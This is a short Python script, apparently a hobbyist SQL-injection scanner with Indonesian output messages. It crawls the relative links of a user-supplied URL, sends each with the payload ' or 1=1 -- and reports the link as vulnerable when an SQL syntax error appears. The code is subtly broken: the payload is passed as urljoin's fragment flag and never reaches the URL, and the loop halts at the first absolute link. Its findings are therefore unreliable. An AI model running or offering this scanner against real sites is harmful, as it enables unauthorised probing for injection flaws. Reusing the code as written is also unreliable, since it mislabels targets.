import urllib.request
from urllib.error import HTTPError,URLError
from urllib.parse import urljoin
from bs4 import BeautifulSoup

def FIND_SQL_INJECTION(url):
    try:
        target = url
        response = urllib.request.urlopen(target)
    except (HTTPError,URLError) as E:
        print(f'problem {E}')
    else:
        soup = BeautifulSoup(response.read().decode('utf-8'),'html.parser')
        param = soup.find_all('a')
        for urls in param:
            if 'https' not in urls['href'] and 'http' not in urls['href']:
                payload = " ' or 1=1 -- "
                parameter_str = str(urls['href'])
                fullurl = urljoin(target,f'/{parameter_str}',payload)
                find_sql = urllib.request.urlopen(fullurl)
                parser_vulnerable = BeautifulSoup(find_sql.read().decode('utf-8'),'html.parser')
                if 'error' in parser_vulnerable.text and 'SQL syntax' in parser_vulnerable.text:
                    print(f"{target}/{urls['href']}{payload} Parameter rentan SQL INJECTION!!")
                else:
                    print(f"{target}/{urls['href']}{payload} Parameter tidak rentan SQL INJECTION!!")
            else:
                break 
if __name__=='__main__':
    target_url = input('url: ')
    FIND_SQL_INJECTION(target_url)                          


        
